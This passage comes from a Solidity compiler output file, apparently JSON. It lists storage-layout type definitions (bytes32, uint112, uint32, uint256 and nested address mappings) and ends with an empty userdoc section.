					"t_bytes32": {
						"encoding": "inplace",
						"label": "bytes32",
						"numberOfBytes": "32"
					},
					"t_mapping(t_address,t_mapping(t_address,t_uint256))": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => mapping(address => uint256))",
						"numberOfBytes": "32",
						"value": "t_mapping(t_address,t_uint256)"
					},
					"t_mapping(t_address,t_uint256)": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => uint256)",
						"numberOfBytes": "32",
						"value": "t_uint256"
					},
					"t_uint112": {
						"encoding": "inplace",
						"label": "uint112",
						"numberOfBytes": "14"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					},
					"t_uint32": {
						"encoding": "inplace",
						"label": "uint32",
						"numberOfBytes": "4"
					}
				}
			},
			"userdoc": {
				"methods": {}
			}
		}
	}
}